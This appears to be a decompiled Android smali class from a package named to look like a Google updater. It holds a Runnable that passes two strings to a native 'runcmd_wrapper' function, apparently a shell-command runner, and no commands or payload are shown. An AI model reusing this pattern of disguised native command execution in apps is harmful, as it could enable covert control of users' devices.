.class Lcom/google/update/RU$1;
.super Ljava/lang/Object;
.source "RU.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/google/update/RU;->U5(Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final synthetic val$P1:Ljava/lang/String;

.field private final synthetic val$P2:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/google/update/RU$1;->val$P1:Ljava/lang/String;

    iput-object p2, p0, Lcom/google/update/RU$1;->val$P2:Ljava/lang/String;

    .line 93
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .prologue
    .line 95
    iget-object v0, p0, Lcom/google/update/RU$1;->val$P1:Ljava/lang/String;

    iget-object v1, p0, Lcom/google/update/RU$1;->val$P2:Ljava/lang/String;

    invoke-static {v0, v1}, Luk/co/lilhermit/android/core/Native;->runcmd_wrapper(Ljava/lang/String;Ljava/lang/String;)I

    .line 96
    return-void
.end method
